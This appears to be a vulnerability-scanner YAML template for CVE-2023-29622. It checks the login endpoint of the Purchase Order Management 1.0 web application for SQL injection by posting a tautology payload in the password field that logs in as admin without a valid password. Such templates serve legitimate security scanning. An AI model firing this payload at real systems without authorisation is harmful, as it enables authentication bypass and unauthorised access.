name: yaml-poc-purchase_order_management_project-purchase_order_management-sql_injection-CVE-2023-29622
binding: 128e1cc9-080e-4667-99d3-b1f7829adb6d
detail:
    author: jiapeng.han
    links:
        - https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/oretnom23/2023/Purchase-Order-Management-1.0/SQLi
        - https://portswigger.net/web-security/sql-injection
    vulnerability:
        id: 3b04a12c-c058-4269-8fcf-9cf4347f974f
        level: critical
    warning: Harmless
transport: http
set:
    rStr1: randomLowercase(8)
    rInt2: randomInt(10000, 99999)
    rStr3: randomLowercase(8)
    rInt4: randomInt(10000, 99999)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /classes/Login.php?f=login
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: username=admin&password={{rStr1}}
            follow_redirects: false
        expression: response.status == 200 && response.body.bstartsWith(b"{\"status\"") && response.body.bcontains(b"incorrect\",\"last_qry")
    r1:
        request:
            cache: true
            method: POST
            path: /classes/Login.php?f=login
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: username=admin&password=-{{rInt4}}') OR {{rInt2}}={{rInt2}} AND ('{{rStr3}}'='{{rStr3}}
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(b"{\"status\":\"success\"}")
expression: r0() && r1()
